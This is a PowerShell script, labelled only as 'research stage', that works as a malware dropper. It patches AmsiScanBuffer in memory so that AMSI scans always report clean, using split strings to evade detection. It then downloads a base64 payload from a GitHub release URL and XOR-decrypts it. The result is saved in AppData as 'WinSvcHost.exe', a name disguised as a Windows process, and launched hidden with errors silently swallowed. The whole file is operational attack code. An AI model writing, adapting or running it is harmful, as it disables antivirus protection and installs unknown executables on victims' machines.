# --- [RESEARCH STAGE: SILENT MEMORY PATCH] ---
function Disable-Amsi {
    try {
        $Win32 = Add-Type -PassThru -Name "Win32" -Namespace "Win32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $Win32::GetModuleHandle("am" + "si.dll")
        if ($h -ne [IntPtr]::Zero) {
            $a = $Win32::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
            $p = 0
            if ($Win32::VirtualProtect($a, [UIntPtr]5, 0x40, [ref]$p)) {
                # Patching AMSI to always return 'Clean'
                [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 
                [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $a, 6)
            }
        }
    } catch { }
}
Disable-Amsi

# --- [RESEARCH STAGE: XOR DECRYPTION & EXECUTION] ---
$url = "https://github.com/adchar2022/test/releases/download/adchara/adchar.txt"
$key = 0xAB # Must match the key used in Phase 1
$dest = "$env:APPDATA\Microsoft\Windows\Templates\WinSvcHost.exe"

try {
    # 1. Download as String
    $wc = New-Object Net.WebClient
    $b64 = $wc.DownloadString($url).Trim()
    
    # 2. Decode and XOR Decrypt in Memory
    $data = [Convert]::FromBase64String($b64)
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
    
    # 3. Write to Disk (in a trusted location)
    if (!(Test-Path (Split-Path $dest))) { New-Item -Path (Split-Path $dest) -ItemType Directory -Force }
    [IO.File]::WriteAllBytes($dest, $data)

    # 4. Detached Execution (Explorer.exe as Parent)
    $s = New-Object -ComObject "Shell.Application"
    $s.ShellExecute($dest, "", "", "open", 0)
} catch { }
